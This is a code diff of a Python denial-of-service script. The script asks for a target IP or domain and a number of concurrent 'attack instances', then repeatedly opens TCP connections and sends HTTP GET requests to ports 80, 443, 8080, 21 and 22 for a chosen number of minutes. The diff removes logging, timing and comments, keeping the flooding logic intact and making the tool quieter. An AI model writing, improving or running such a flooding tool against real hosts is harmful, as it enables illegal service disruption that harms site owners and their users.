@@ -2,7 +2,6 @@ import asyncio
 import os
 import subprocess
 import socket
-import time
 from typing import Dict, Tuple
 
 class bcolors:
@@ -21,15 +20,12 @@ class CustomTCPProtocol(asyncio.Protocol):
 
     def connection_made(self, transport):
         self.transport = transport
-        print(f"{bcolors.OKGREEN}Connection established{bcolors.ENDC}")
 
     def data_received(self, data: bytes) -> None:
         for dest in self.destinations.values():
             dest[0].put_nowait(data)
 
     def connection_lost(self, exc):
-        if exc and not isinstance(exc, asyncio.CancelledError):
-            print(f"{bcolors.FAIL}Connection lost{bcolors.ENDC}")
         for dest in self.destinations.values():
             dest[1].release()
         self.destinations.clear()
@@ -55,9 +51,8 @@ async def attack(target: str, duration_minutes: int, attack_count: int, progress
     async def attack_port(port: int):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(1)  # Set a timeout for the connection
+                s.settimeout(1)
                 s.connect((target, port))
-                start = time.time()
                 
                 if port == 80:
                     s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
@@ -66,19 +61,15 @@ async def attack(target: str, duration_minutes: int, attack_count: int, progress
                 else:
                     s.send(b"GET / HTTP/1.1\r\n\r\n")
                 
-                s.recv(1024)  # Receive response
-                end = time.time()
-                ping = round((end - start) * 1000, 2)
-                print(bcolors.OKGREEN + f"Successfully started to plague {target}:{port}! 🤢🦠 Attempting to destroy | Ping: {ping}ms{bcolors.ENDC}")
-                progress_queue.put_nowait(1)  # Indicate a request was sent
+                s.recv(1024)  
+                progress_queue.put_nowait(1)
 
-        except Exception as e:
-            print(bcolors.FAIL + f"IP/WEBSITE COULD BE FULLY INFECTED🟥: {e}{bcolors.ENDC}")
+        except Exception:
+            pass
 
     for _ in range(attack_count):
-        for port in [80, 443, 8080, 21, 22]:  # Specify ports to attack
-            task = asyncio.create_task(attack_port(port))
-            tasks.append(task)
+        for port in [80, 443, 8080, 21, 22]:
+            tasks.append(asyncio.create_task(attack_port(port)))
 
     await asyncio.wait(tasks)
 
@@ -113,7 +104,7 @@ async def main():
     target = input(f"{bcolors.HEADER}Enter the target IP or domain: {bcolors.ENDC}")
     attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances: {bcolors.ENDC}"))
     
-    total_requests = attack_count * 5 * duration_minutes * 60  # Estimate total requests
+    total_requests = attack_count * 5 * duration_minutes * 60
     print(f"{bcolors.OKGREEN}Attacking {target} for {duration_minutes} minutes with {attack_count} instances...{bcolors.ENDC}")
 
     progress_queue = asyncio.Queue()
